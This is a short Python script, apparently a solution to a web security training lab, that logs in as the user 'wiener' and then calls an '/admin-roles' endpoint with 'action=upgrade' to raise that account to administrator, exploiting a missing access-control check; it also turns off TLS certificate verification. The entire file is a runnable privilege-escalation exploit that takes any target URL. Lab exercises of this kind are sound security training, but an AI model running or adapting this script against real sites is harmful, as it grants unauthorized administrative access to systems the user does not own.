import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def upgrade_user(s,url):
    data_login = "/login"
    params = {'username':'wiener','password':'peter'}
    r = s.post(url+data_login,data = params,verify=False)

    if "Log out" in r.text:
        print("logged in")
    else:
        print("exiting")
        sys.exit(-1)
    
    exploit_vuln = "/admin-roles?username=wiener&action=upgrade"
    r = s.get(url+exploit_vuln,verify=False)

    if "Admin panel" in r.text:
        print("upgraded successfully")
    else:
        print("exploit failed")
        sys.exit(-1)


def main():
    if len(sys.argv)!=2:
        print("[+]usage:%s <url>"%sys.argv[0])
    else:
        print("[+]upgrading user...")
        url = sys.argv[1]
        s = requests.Session()
        upgrade_user(s,url)

if __name__ == "__main__":
    main()